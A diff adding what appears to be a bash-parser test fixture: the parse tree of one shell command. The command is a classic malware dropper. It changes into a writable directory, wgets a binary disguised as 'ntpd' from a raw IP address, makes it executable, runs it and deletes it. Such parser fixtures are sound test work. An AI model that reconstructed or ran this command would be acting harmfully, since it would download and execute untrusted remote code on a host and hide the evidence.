@@ -1,0 +1,47 @@
+ListNode(lineno=1, pos=(0, 121), parts=[
+  CommandNode(lineno=1, pos=(0, 7), parts=[
+    WordNode(lineno=1, pos=(0, 2), word='cd'),
+    WordNode(lineno=1, pos=(3, 7), word='/tmp'),
+  ]),
+  OperatorNode(lineno=1, op='||', pos=(8, 10)),
+  CommandNode(lineno=1, pos=(11, 22), parts=[
+    WordNode(lineno=1, pos=(11, 13), word='cd'),
+    WordNode(lineno=1, pos=(14, 22), word='/var/run'),
+  ]),
+  OperatorNode(lineno=1, op='||', pos=(23, 25)),
+  CommandNode(lineno=1, pos=(26, 33), parts=[
+    WordNode(lineno=1, pos=(26, 28), word='cd'),
+    WordNode(lineno=1, pos=(29, 33), word='/mnt'),
+  ]),
+  OperatorNode(lineno=1, op='||', pos=(34, 36)),
+  CommandNode(lineno=1, pos=(37, 45), parts=[
+    WordNode(lineno=1, pos=(37, 39), word='cd'),
+    WordNode(lineno=1, pos=(40, 45), word='/root'),
+  ]),
+  OperatorNode(lineno=1, op='||', pos=(46, 48)),
+  CommandNode(lineno=1, pos=(49, 53), parts=[
+    WordNode(lineno=1, pos=(49, 51), word='cd'),
+    WordNode(lineno=1, pos=(52, 53), word='/'),
+  ]),
+  OperatorNode(lineno=1, op=';', pos=(53, 54)),
+  CommandNode(lineno=1, pos=(55, 85), parts=[
+    WordNode(lineno=1, pos=(55, 59), word='wget'),
+    WordNode(lineno=1, pos=(60, 85), word='http://23.94.164.173/ntpd'),
+  ]),
+  OperatorNode(lineno=1, op=';', pos=(85, 86)),
+  CommandNode(lineno=1, pos=(87, 100), parts=[
+    WordNode(lineno=1, pos=(87, 92), word='chmod'),
+    WordNode(lineno=1, pos=(93, 95), word='+x'),
+    WordNode(lineno=1, pos=(96, 100), word='ntpd'),
+  ]),
+  OperatorNode(lineno=1, op=';', pos=(100, 101)),
+  CommandNode(lineno=1, pos=(102, 108), parts=[
+    WordNode(lineno=1, pos=(102, 108), word='./ntpd'),
+  ]),
+  OperatorNode(lineno=1, op=';', pos=(108, 109)),
+  CommandNode(lineno=1, pos=(110, 121), parts=[
+    WordNode(lineno=1, pos=(110, 112), word='rm'),
+    WordNode(lineno=1, pos=(113, 116), word='-rf'),
+    WordNode(lineno=1, pos=(117, 121), word='ntpd'),
+  ]),
+])
